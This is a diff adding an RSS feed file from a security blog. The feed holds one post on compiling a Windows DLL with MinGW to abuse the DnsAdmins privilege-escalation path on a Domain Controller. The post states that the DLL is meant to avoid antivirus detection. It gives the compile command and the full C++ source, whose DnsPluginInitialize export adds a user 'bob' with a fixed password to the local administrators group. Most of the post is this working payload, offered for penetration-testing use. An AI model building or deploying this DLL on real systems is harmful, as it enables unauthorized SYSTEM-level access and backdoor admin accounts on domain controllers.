@@ -1,0 +1,93 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>cpp on malicious.link</title>
+    <link>https://malicious.link/tags/cpp/</link>
+    <description>Recent content in cpp on malicious.link</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 09 Feb 2020 09:30:44 -0500</lastBuildDate>
+    
+        <atom:link href="https://malicious.link/tags/cpp/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Compiling a DLL using MingGW</title>
+      <link>https://malicious.link/post/2020/compiling-a-dll-using-mingw/</link>
+      <pubDate>Sun, 09 Feb 2020 09:30:44 -0500</pubDate>
+      
+      <guid>https://malicious.link/post/2020/compiling-a-dll-using-mingw/</guid>
+      <description>&lt;p&gt;Compiling a Windows DLL has always been a pain for me. Getting Visual Studio working is frustrating (or at least used to be, before VS2019). I ran into this same issue recently. I didn&#39;t have Visual Studio readily available because the VMs I had built for the task were left behind. I always knew that MinGW could build DLLs; however, I never spent the time to figure it out.&lt;/p&gt;
+&lt;p&gt;Now was that time. I needed a DLL that wouldn&#39;t be caught by AV, and I could use it to exploit the DNS Admin escalation path. You can read all about the DNS Admin escalation path in the resources below, but the TL;DR boils down to if you happen to be in the local group called &amp;ldquo;DnsAdmins&amp;rdquo; on a Domain Controller, then you have permission to load a DLL into the DNS service running as SYSTEM.&lt;/p&gt;
+&lt;p&gt;(DnsAdmins is a LOCAL group, which through me off for a long time about this attack. Trying to find it at the domain level was super annoying. On my test DC, I could see it, but when I was doing engagements, I never seemed to find it.)&lt;/p&gt;
+&lt;h2 id=&#34;resources&#34;&gt;Resources&lt;/h2&gt;
+&lt;p&gt;DNS Admin Resources:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/kazkansouh/DNSAdmin-DLL&#34;&gt;https://github.com/kazkansouh/DNSAdmin-DLL&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/dim0x69/dns-exe-persistance&#34;&gt;https://github.com/dim0x69/dns-exe-persistance&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise&#34;&gt;https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=4064&#34;&gt;https://adsecurity.org/?p=4064&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83&#34;&gt;https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Compiling DLLs with MinGW:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.didierstevens.com/2019/10/28/quickpost-compiling-service-dlls-with-mingw-on-kali/&#34;&gt;https://blog.didierstevens.com/2019/10/28/quickpost-compiling-service-dlls-with-mingw-on-kali/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.didierstevens.com/2018/07/10/quickpost-compiling-dlls-with-mingw-on-kali/&#34;&gt;https://blog.didierstevens.com/2018/07/10/quickpost-compiling-dlls-with-mingw-on-kali/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;compiling&#34;&gt;Compiling&lt;/h2&gt;
+&lt;p&gt;&amp;hellip; here is the super exciting output from compiling the DLL&amp;hellip;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@kali:~/dnsadmin# x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp
+root@kali:~/dnsadmin# 
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;example-code&#34;&gt;Example Code&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+
+// Here so I remember how to compile it.
+// x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp
+
+extern &amp;quot;C&amp;quot; __declspec(dllexport) int DnsPluginInitialize(PVOID a1, PVOID a2)
+{
+  system(&amp;quot;net.exe user bob Password123 /add&amp;quot;);
+  system(&amp;quot;net.exe localgroup administrators bob /add&amp;quot;);
+  return 0;
+}
+
+extern &amp;quot;C&amp;quot; __declspec(dllexport) int DnsPluginCleanup()
+{
+  return 0;
+}
+
+extern &amp;quot;C&amp;quot; __declspec(dllexport) int DnsPluginQuery(PSTR a1, WORD a2, PSTR a3, PVOID a4)
+{
+  return 0;
+}
+
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+{
+    switch (fdwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+        OutputDebugString(&amp;quot;DLL_PROCESS_ATTACH&amp;quot;);
+        break;
+
+    case DLL_THREAD_ATTACH:
+        OutputDebugString(&amp;quot;DLL_THREAD_ATTACH&amp;quot;);
+        break;
+
+    case DLL_THREAD_DETACH:
+        OutputDebugString(&amp;quot;DLL_THREAD_DETACH&amp;quot;);
+        break;
+
+    case DLL_PROCESS_DETACH:
+        OutputDebugString(&amp;quot;DLL_PROCESS_DETACH&amp;quot;);
+        break;
+    }
+
+    return TRUE;
+}
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+  </channel>
+</rss>
